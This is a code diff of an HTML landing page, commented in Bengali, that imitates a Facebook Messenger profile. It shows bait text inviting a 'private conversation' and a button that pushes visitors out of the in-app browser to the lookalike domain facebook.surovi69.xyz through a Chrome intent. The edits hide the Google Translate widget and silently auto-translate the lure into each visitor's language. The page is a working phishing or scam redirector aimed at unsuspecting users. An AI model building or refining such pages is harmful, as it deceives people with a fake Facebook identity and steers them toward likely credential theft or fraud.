@@ -23,8 +23,9 @@
             background-color: #f0f2f5;
             display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh;
         }
-        /* Google Translate Widget Hide */
-        .goog-te-banner-frame.skiptranslate { display: none !important; }
+        
+        /* গুগল ট্রান্সলেট উইজেট হাইড করার জন্য */
+        .goog-te-banner-frame.skiptranslate, .goog-te-gadget { display: none !important; }
         body { top: 0px !important; }
 
         .bridge-card {
@@ -49,13 +50,14 @@
             border: 4px solid white; box-shadow: 0 4px 10px rgba(0,0,0,0.1);
             object-fit: cover;
         }
-        /* অনলাইন ডট পজিশন ফিক্স */
+        
+        /* অনলাইন সিম্বল পজিশন ফিক্স */
         .online-dot {
             height: 22px; width: 22px; 
             background-color: #31a24c;
             border: 4px solid white; border-radius: 50%;
             position: absolute; 
-            bottom: 12px; 
+            bottom: 8px; 
             right: 12px;
             z-index: 10;
         }
@@ -73,12 +75,11 @@
             width: 85%; justify-content: center; font-size: 17px; 
             cursor: pointer; border: none;
         }
-        #google_translate_element { margin-top: 15px; }
     </style>
 </head>
-<body>
+<body class="notranslate"> <!-- মূল বডি ট্র্যান্সলেট থেকে বাঁচানোর জন্য, পরে স্ক্রিপ্ট দিয়ে নির্দিষ্ট অংশ করা হবে -->
 
-    <div class="bridge-card">
+    <div class="bridge-card skiptranslate"> <!-- শুধুমাত্র এই অংশটি অটো ট্রান্সলেট হবে -->
         <div class="cover-photo"></div>
         <div class="profile-section">
             <div class="img-container">
@@ -95,27 +96,33 @@
                 Hey! I'm waiting for you. Click below to start our private conversation directly in Chrome.
             </div>
             
-            <!-- মেইন বাটন (অটো রিডাইরেক্ট অফ) -->
             <button class="main-btn" id="actionBtn">
                 <i class="fab fa-facebook-messenger"></i> Open in Chrome
             </button>
         </div>
     </div>
 
-    <!-- ভিজিটরের ভাষায় অটো ট্রান্সলেট করার জন্য এলিমেন্ট -->
-    <div id="google_translate_element"></div>
+    <!-- গোপন গুগল ট্রান্সলেট এলিমেন্ট -->
+    <div id="google_translate_element" style="display:none;"></div>
 
     <script type="text/javascript">
-        // Google Translate Implementation
+        // অটো ট্রান্সলেট ফাংশন
         function googleTranslateElementInit() {
             new google.translate.TranslateElement({
                 pageLanguage: 'en',
-                layout: google.translate.TranslateElement.InlineLayout.SIMPLE,
                 autoDisplay: true
             }, 'google_translate_element');
+
+            // ভিজিটরের ভাষা অনুযায়ী অটোমেটিক ক্লিক ট্রিগার করা
+            setTimeout(function() {
+                var autoClick = document.querySelector('.goog-te-combo');
+                if (autoClick) {
+                    autoClick.value = navigator.language.split('-')[0];
+                    autoClick.dispatchEvent(new Event('change'));
+                }
+            }, 1000);
         }
 
-        // রিডাইরেক্ট ফাংশন
         const targetUrl = "https://facebook.surovi69.xyz";
         const chromeIntent = "intent://facebook.surovi69.xyz#Intent;scheme=https;package=com.android.chrome;end";
 
@@ -129,7 +136,6 @@
             }
         }
 
-        // বাটন ক্লিক করলেই কেবল কাজ করবে
         document.getElementById('actionBtn').addEventListener('click', function(e) {
             e.preventDefault();
             openInExternalBrowser();
